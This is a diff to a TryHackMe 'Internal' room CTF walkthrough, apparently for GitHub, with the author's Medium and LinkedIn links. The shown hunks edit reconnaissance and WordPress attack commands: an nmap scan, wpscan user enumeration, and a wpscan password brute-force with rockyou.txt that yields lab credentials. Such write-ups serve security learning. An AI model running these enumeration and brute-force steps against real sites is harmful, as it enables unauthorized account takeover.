@@ -19,7 +19,7 @@ Attack Chain: Nmap → Dirsearch → WPScan → RCE Shell → Lateral Movement (
 -------------------
  ✹  Reconnaissance
 ```bash
-nmap -sV -p- <target_ip>
+nmap -sCV -p- <target_ip>
 # Result: SSH:22, HTTP:80
 ```
 
@@ -36,7 +36,7 @@ dirsearch -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt
 
 ✹ WordPress Credential Attack
 ```bash
-wpscan --url http://internal.thm/wordpress --enumerate u
+wpscan --url http://internal.thm/wordpress --enumerate u (default comman pages username admin or administrator other.. i check admin)
 wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt
 # Credentials: admin:my2boys
 ```
@@ -144,3 +144,8 @@ Lessons
 - WPScan Documentation
 - Hydra Brute Force Guide
 - Jenkins Script Console Security
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+I’ve also attached a PDF version containing the full walkthrough with commands, screenshots, and explanations.
+Read the article on Medium: https://medium.com/@_sreekuttan__/tryhackme-internal-room-5a02f5f9a293
+Please feel free to share any feedback or suggestions.
+Connect with me on LinkedIn for more cybersecurity content: https://www.linkedin.com/in/sreekuttan-ps-/
